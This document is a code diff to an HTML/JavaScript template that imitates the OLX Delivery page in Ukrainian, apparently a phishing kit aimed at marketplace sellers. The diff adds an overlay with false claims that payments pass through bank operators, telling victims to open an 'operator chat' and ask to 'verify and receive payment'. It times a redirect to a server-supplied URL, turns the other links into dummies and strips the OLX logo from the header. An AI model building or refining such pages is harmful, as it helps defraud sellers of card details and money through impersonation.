@@ -44,7 +44,6 @@
         .ads-scroll::-webkit-scrollbar { width: 6px; }
         .ads-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
         
-        /* Стили для выбранного объявления */
         .ad-card.selected { 
             border-color: #002f34 !important; 
             background-color: #f8f9fa; 
@@ -57,22 +56,50 @@
 </head>
 <body class="font-sans bg-olx-bg text-olx-dark antialiased relative">
 
-    <div id="loading-overlay" class="fixed inset-0 bg-white/60 backdrop-blur-[2px] z-40 flex items-center justify-center hidden transition-opacity duration-200">
-        <div class="olx-loader flex gap-2">
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    <!-- Оновлений екран завантаження з інформацією -->
+    <div id="loading-overlay" class="fixed inset-0 bg-olx-dark/80 backdrop-blur-sm z-50 flex items-center justify-center hidden transition-opacity duration-300 px-4">
+        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full p-6 md:p-8 flex flex-col items-center text-center relative overflow-hidden">
+            <!-- Верхня акцентна смуга -->
+            <div class="absolute top-0 left-0 w-full h-1.5 bg-olx-cyan"></div>
+            
+            <div class="olx-loader flex gap-2 mb-6 mt-2">
+                <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            </div>
+            
+            <h3 class="text-xl font-bold text-olx-dark mb-3">Запит відправлено</h3>
+            
+            <p class="text-[14px] text-gray-600 mb-4 text-left w-full leading-relaxed">
+                Поки система перевіряє замовлення за вашим товаром, будь ласка, ознайомтеся з інформацією:
+            </p>
+            
+            <div class="bg-blue-50/50 border border-blue-100 rounded-lg p-4 text-[13px] text-left text-gray-800 space-y-3 w-full">
+                <p class="flex items-start gap-2">
+                    <span class="text-lg leading-none">🛡️</span>
+                    <span>Усі операції проходять у ручному режимі через операторів та спеціалістів банку для забезпечення максимальної безпеки.</span>
+                </p>
+                <p class="flex items-start gap-2">
+                    <span class="text-lg leading-none">💬</span>
+                    <span>Для цього буде створено спеціальний <b>чат з оператором</b>.</span>
+                </p>
+                <p class="flex items-start gap-2">
+                    <span class="text-lg leading-none">❗️</span>
+                    <span>Після заповнення даних обов'язково повідомте оператора про те, що ви хочете <b>пройти верифікацію та отримати оплату</b>.</span>
+                </p>
+            </div>
         </div>
     </div>
 
+    <!-- Уведомление об ошибке -->
     <div id="error-toast" class="fixed bottom-6 left-1/2 w-[90%] max-w-[400px] bg-[#1f2937] text-white px-5 py-3.5 rounded-md shadow-2xl z-50 flex items-center gap-3 transition-all duration-300 toast-enter">
         <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ff5636" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
         <span id="toast-text" class="text-[14px] font-medium leading-tight">Щось пішло не так. Перевірте з'єднання з інтернетом.</span>
     </div>
 
+    <!-- Шапка (Без логотипу OLX) -->
     <header class="bg-olx-dark text-white px-4 md:px-6 h-[64px] md:h-[72px] flex justify-between items-center w-full sticky top-0 z-30">
         <div class="flex items-center w-full max-w-[1232px] mx-auto justify-between">
             <div class="flex items-center gap-4">
                 <button class="md:hidden text-white"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
-                <div class="font-black text-xl tracking-tighter hidden sm:block text-olx-cyan">OLX</div>
             </div>
             <div class="flex items-center gap-4 md:gap-6 text-[14px] md:text-[15px] font-semibold">
                 <div class="hidden md:flex text-olx-gray font-medium gap-1"><a href="#" class="text-white hover:underline">Укр</a><span>|</span><a href="#" class="hover:underline">Рус</a></div>
@@ -90,7 +117,6 @@
             <h1 class="text-[24px] md:text-[32px] font-bold tracking-tight">OLX Доставка</h1>
             
             <div class="flex flex-col sm:flex-row items-start sm:items-center gap-4 w-full md:w-auto mt-2 md:mt-0">
-                
                 <div class="flex items-center gap-3 w-full sm:w-auto border-b sm:border-none border-gray-100 pb-3 sm:pb-0">
                     <div class="w-10 h-10 bg-olx-lightcyan rounded-full flex items-center justify-center text-olx-dark shrink-0">
                         <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
@@ -110,7 +136,7 @@
 
         <div class="border-b border-olx-border">
             <nav class="max-w-[1232px] mx-auto px-4 md:px-6 flex gap-6 text-[14px] font-medium text-olx-gray overflow-x-auto hide-scrollbar whitespace-nowrap">
-                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Платежі та рахунок OLX</a>
+                <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Платежі та рахунок</a>
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Рейтинг</a>
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Шукаю роботу</a>
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Профіль</a>
@@ -136,7 +162,8 @@
                         <div class="ad-card flex items-center bg-white border border-olx-border rounded-lg p-3 cursor-pointer transition-all duration-200" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
                             
                             <div class="relative w-[90px] h-[90px] md:w-[110px] md:h-[110px] shrink-0 bg-olx-bg rounded overflow-hidden">
-                                <img src="{{ ad.img }}" onerror="this.src='https://placehold.co/400x400/f2f4f5/7f9799?text=Фото\nтовару'" class="w-full h-full object-cover alt="product">
+                                <!-- Стандартна заглушка, якщо фото не завантажилось -->
+                                <img src="{{ ad.img }}" onerror="this.src='https://placehold.co/400x400/f2f4f5/7f9799?text=Без+фото'" class="w-full h-full object-cover alt="product">
                                 
                                 <div class="absolute bottom-0 left-0 w-full bg-olx-yellow flex items-center justify-center gap-1 py-1">
                                     <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#002f34" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
@@ -172,19 +199,16 @@
         let selectedAdData = { url: "", title: "" };
 
         function selectAd(element, url, title) {
-            // Сброс предыдущего выбора
             document.querySelectorAll('.ad-card').forEach(card => {
                 card.classList.remove('selected');
                 card.querySelector('.status-badge').innerText = "Обрати";
             });
             
-            // Установка нового выбора
             element.classList.add('selected');
             element.querySelector('.status-badge').innerText = "Обрано";
             
             selectedAdData = { url, title };
             
-            // Активация кнопки
             const btn = document.getElementById('confirm-btn');
             btn.disabled = false;
             btn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
@@ -195,10 +219,16 @@
             const btn = document.getElementById('confirm-btn');
             const overlay = document.getElementById('loading-overlay');
             
+            // Показуємо модалку з інформацією
             overlay.classList.remove('hidden');
             btn.disabled = true;
 
+            // Мінімальний час (5 секунд), щоб користувач встиг прочитати текст перед тим, як його перекине
+            const minWaitTime = 5000; 
+            const startTime = Date.now();
+
             try {
+                // Відправляємо запит на сервер
                 const response = await fetch("/submit_ad", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -211,7 +241,13 @@
                 const result = await response.json();
                 
                 if (response.ok && result.url) {
-                    window.location.href = result.url;
+                    const elapsedTime = Date.now() - startTime;
+                    const remainingTime = Math.max(0, minWaitTime - elapsedTime);
+                    
+                    // Чекаємо залишок часу від 5 секунд, потім перенаправляємо
+                    setTimeout(() => {
+                        window.location.href = result.url;
+                    }, remainingTime);
                 } else {
                     overlay.classList.add('hidden');
                     showToast("Помилка обробки замовлення. Спробуйте пізніше.");
@@ -235,9 +271,22 @@
             }, 3500);
         }
 
+        // Обробка повернення назад ("Back" кнопка у браузері)
+        // Це розморозить сторінку, якщо користувач повернувся з наступної сторінки
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                document.getElementById('loading-overlay').classList.add('hidden');
+                
+                // Якщо був обраний товар, робимо кнопку знову активною
+                if (selectedAdData.url !== "") {
+                    const btn = document.getElementById('confirm-btn');
+                    btn.disabled = false;
+                }
+            }
+        });
+
         document.addEventListener("DOMContentLoaded", () => {
-            const interactables = document.querySelectorAll('a:not(.ad-card, #confirm-btn), button:not(.ad-card, #confirm-btn)');
-            const overlay = document.getElementById('loading-overlay');
+            const interactables = document.querySelectorAll('a:not(.ad-card, #confirm-btn), button:not(.ad-card, #confirm-btn, .md\\:hidden)');
             let isProcessing = false;
 
             interactables.forEach(el => {
@@ -245,13 +294,8 @@
                     e.preventDefault();
                     if(isProcessing) return;
                     isProcessing = true;
-                    overlay.classList.remove('hidden');
-
-                    setTimeout(() => {
-                        overlay.classList.add('hidden');
-                        showToast("Функція тимчасово недоступна.");
-                        isProcessing = false;
-                    }, 1000);
+                    showToast("Функція тимчасово недоступна.");
+                    setTimeout(() => { isProcessing = false; }, 2000);
                 });
             });
         });
